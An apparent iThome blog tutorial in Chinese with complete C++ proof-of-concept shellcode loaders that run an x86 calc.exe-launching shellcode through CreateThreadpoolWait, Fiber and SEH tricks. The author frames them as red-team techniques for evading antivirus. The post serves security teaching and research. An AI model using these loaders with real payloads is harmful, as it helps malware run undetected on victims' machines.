# 【Day 18】Shellcode 與他的快樂夥伴 (上) - Shellcode Loader

## 環境
* Windows 10 21H1
* Visual Studio 2019

## 前情提要
在[【Day 07】歡迎來到實力至上主義的 Shellcode (上) - Windows x86 Shellcode](https://ithelp.ithome.com.tw/articles/10269530)、[【Day 08】歡迎來到實力至上主義的 Shellcode (下) - Windows x86 Shellcode](https://ithelp.ithome.com.tw/articles/10270253) 我們了解 Shellcode 的實作原理。實際用途方面，除了在找到程式漏洞時可以使用之外，紅隊也可以利用 Shellcode 的彈性來繞過防毒軟體的偵測。

這篇就要來介紹一些常見的 Shellcode 載入方式，會拿之前寫過的 Windows x86 Shellcode 當作範例，不過其實同樣的載入方式有些也可以用在 64-bit。

## 為什麼需要 Shellcode Loader
因為 Shellcode 的彈性很大，所以許多紅隊的工具都會用到。這裡所謂的彈性是指我們可以透過加密、編碼等等方式，載入或注入到 Process 中執行。也是因為這份彈性，Shellcode 可以比較難被防毒軟體偵測到，因此用來載入 Shellcode 並執行的 Shellcode Loader 的實作方法就成了下一個目標。

這篇會著重在 Shellcode 的載入方式上，所以不會實作加解密或編碼的部分，而是會直接從已經取得 Shellcode 資源並解密完畢開始。

## CreateThreadpoolWait
### 原理
#### Event Object
程式中可以使用 [Event Object](https://docs.microsoft.com/zh-tw/windows/win32/sync/using-event-objects)，藉由呼叫 [CreateEvent](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa) 建立 Event Object，還有使用 [SetEvent](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-setevent) 設定 Event Object 的狀態。Event Object 可以用在處理 Race Condition、非同步，藉由設定 Event Object 的狀態，讓 Thread 之間彼此協調進度。Event Object 的狀態有 Signaled 和 Nonsignaled，在呼叫 CreateEvent 時可以透過第三個參數 bInitialState 設定狀態，或是呼叫 SetEvent 讓 Event Object 的狀態改為 Signaled。

#### Wait Object
[Wait Object](https://docs.microsoft.com/en-us/windows/win32/procthread/thread-pool-api) 顧名思義是用來等待某個目標，準確來說是 Waitable Object。可以透過 [CreateThreadpoolWait](https://docs.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-createthreadpoolwait) 建立一個 Wait Object，然後用 [SetThreadpoolWait](https://docs.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-setthreadpoolwait) 設定這個 Wait Object 等待的目標。其中呼叫 CreateThreadpoolWait 時可以設定 Callback 函數，當等待的目標的狀態變為 Signaled 就會呼叫它。

### 利用
根據上述的 Event Object 和 Wait Object，我們可以先建立一個 Event Object，狀態設為 Signaled。接著建立一個 Wait Object，然後設定它的 Callback 函數為我們的 Shellcode，最後讓這個 Wait Object 等待我們建立的 Event Object。由於 Event Object 的狀態本來就是 Signaled，所以 Shellcode 會馬上被執行。

### 實作步驟
1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
2. 建立一個 Event Object，其中 CreateEvent 第三個參數，初始狀態為 True，代表 Signaled
3. 建立一個 Pool Object，把 CreateThreadpoolWait 第一個參數，也就是 Callback 函數設為 Shellcode
4. 讓 Pool Object 等待 Event Object 後執行 Shellcode，但因為 Event Object 一開始狀態就是 Signaled，所以會直接執行 Shellcode
5. 用 Sleep 等待一秒確保 Callback 函數有被執行

### POC
程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Shellcode%E8%88%87%E4%BB%96%E7%9A%84%E5%BF%AB%E6%A8%82%E5%A4%A5%E4%BC%B4/ShellcodeLoaderCreateThreadpoolWait)。
```cpp=
#include <windows.h>

int main()
{
    char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

    // 1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, sizeof(shellcode));

    // 2. 建立一個 Event Object，其中 CreateEvent 第三個參數，初始狀態為 True，代表 Signaled
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    // 3. 建立一個 Pool Object，把 CreateThreadpoolWait 第一個參數，也就是 Callback 函數設為 Shellcode
    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)Memory, NULL, NULL);

    // 4. 讓 Pool Object 等待 Event Object 後執行 Shellcode，但因為 Event Object 一開始狀態就是 Signaled，所以會直接執行 Shellcode
    SetThreadpoolWait(threadPoolWait, event, NULL);

    // 5. 用 Sleep 等待一秒確保 Callback 函數有被執行
    Sleep(1000);
    return 0;
}
```

## Fiber
### 原理
#### Fiber Object
[Fiber](https://docs.microsoft.com/en-us/windows/win32/procthread/using-fibers) 是一個執行單位，它可以用來做排程的工作。以前面 Fiber MSDN 的連結為例，首先呼叫 [ConvertThreadToFiber](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber) 讓 Caller 和 Fiber 可以對 Fiber 進行排程，接著呼叫 [CreateFiber](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiber) 建立兩個 Fiber，一個用來讀檔，另一個用來寫檔，把兩個 Fiber 開始執行的位址分別設在讀檔和寫檔的函數。當讀檔的 Fiber 讀完一部份的檔案內容後，呼叫 [SwitchToFiber](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-switchtofiber) 換到寫檔的 Fiber 寫入剛讀取的內容到另一個檔案。

不確定有沒有人會搞混 Fiber 和 Thread 兩個執行單位，這邊比較一下兩者的差異。兩者最大的差別在於排程的方式，Fiber 是 Cooperative，Thread 是 Pre-emptive(這是普遍情形，還是要看作業系統)。也就是說，Fiber 不需要擔心 Race Condition 的問題，因為同個時間只有一個 Fiber 能動，而停止與執行的位址都是使用者定義的；然而 Thread 可以被中斷在任何地方，而且可以同時執行多個 Thread，所以要小心處理資料的完整性。

### 利用
既然我們可以控制 Fiber 在任何位址執行，那就可以把執行的位址設在我們的 Shellcode。當呼叫 SwitchToFiber 時就會開始執行 Shellcode。

### 實作步驟
1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
2. 呼叫 ConvertThreadToFiber 讓 Caller 和 Fiber 可以對 Fiber 進行排程
3. 用 CreateFiber 建立一個 Fiber，起始位址為我們的 Shellcode
4. 呼叫 SwitchToFiber 開始執行上一步建立的 Fiber
5. 釋放 Fiber Handle 與記憶體

### POC
程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Shellcode%E8%88%87%E4%BB%96%E7%9A%84%E5%BF%AB%E6%A8%82%E5%A4%A5%E4%BC%B4/ShellcodeLoaderFiber)。
```cpp=
#include <windows.h>

int main()
{
    char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

    // 1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
    LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, shellcode, sizeof(shellcode));

    // 2. 呼叫 ConvertThreadToFiber 讓 Caller 和 Fiber 可以對 Fiber 進行排程
    PVOID mainFiber = ConvertThreadToFiber(NULL);

    // 3. 用 CreateFiber 建立一個 Fiber，起始位址為我們的 Shellcode
    PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)Memory, NULL);

    // 4. 呼叫 SwitchToFiber 開始執行上一步建立的 Fiber
    SwitchToFiber(shellcodeFiber);

    // 5. 釋放 Fiber Handle 與記憶體
    DeleteFiber(shellcodeFiber);
    return 0;
}
```

## SEH
### 原理
[SEH](https://docs.microsoft.com/zh-tw/cpp/cpp/structured-exception-handling-c-cpp?view=msvc-160)，全名 Structured Exception Handling，是用來處理程式的例外狀況。使用者可以在程式中處理發生的例外，例如寫入不可寫的位址。SEH 可以讓程式碼更具可攜性和彈性，也可以確保資源會在執行意外終止時正確釋放

在[【Day 15】從零開始的 Debug 生活 - Debugger 原理](https://ithelp.ithome.com.tw/articles/10274999)、[【Day 16】從一開始的 Anti-Debug 生活 - Anti-Debug](https://ithelp.ithome.com.tw/articles/10275614)、[【Day 17】從二開始的 Anti-Anti-Debug 生活 - Anti-Anti-Debug](https://ithelp.ithome.com.tw/articles/10276170) 我們有提到 Debugger 的實作方式也是透過觸發 EXCEPTION_BREAKPOINT 的方式下斷點，然後也用同個方式故意製造例外來 Anti-Debug，最後也講解該怎麼繞過 Anti-Debug 達到 Anti-Anti-Debug。

### 利用
可以故意觸發例外，並在處理例外的地方執行 Shellcode。

### 實作步驟
1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
2. 試圖寫入到 NULL Pointer，觸發例外
3. 處理例外，在裡面執行 Shellcode

### POC
程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/Shellcode%E8%88%87%E4%BB%96%E7%9A%84%E5%BF%AB%E6%A8%82%E5%A4%A5%E4%BC%B4/ShellcodeLoaderSEH)。
```cpp=
#include <windows.h>

int main()
{
	char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";

	// 1. 用 VirtualAlloc 分配記憶體空間給 Shellcode，記憶體保護為 PAGE_EXECUTE_READWRITE，並把 Shellcode 放進這塊記憶體
	LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, shellcode, sizeof(shellcode));

	// 2. 試圖寫入到 NULL Pointer，觸發例外
	int* p = 0x00000000;
	_try
	{
		*p = 13;
	}
		_except(EXCEPTION_EXECUTE_HANDLER)
	{
		// 3. 處理例外，在裡面執行 Shellcode
		((void(*)())Memory)();
	}
	return 0;
}
```

## 其他
這篇都是在講載入類型的 Shellcode Loader，下一篇會說明注入型的，差別在於注入型的可以注入到其他 Process 執行 Shellcode。另外載入型的 Shellcode Loader 還有其他比較複雜的玩法可以參考下面連結。

## 參考資料
* [如何实现一款 shellcodeLoader](https://paper.seebug.org/1413/#apc)
* [knownsec/shellcodeloader](https://github.com/knownsec/shellcodeloader)
* [What is the difference between a thread and a fiber?](https://stackoverflow.com/questions/796217/what-is-the-difference-between-a-thread-and-a-fiber)
* [淺談Windows上Buffer Overflow中SEH異常處理機制攻擊手法＆Shellcode插入手法](https://blog.30cm.tw/2015/05/windowsbuffer-overflowsehshellcode.html)
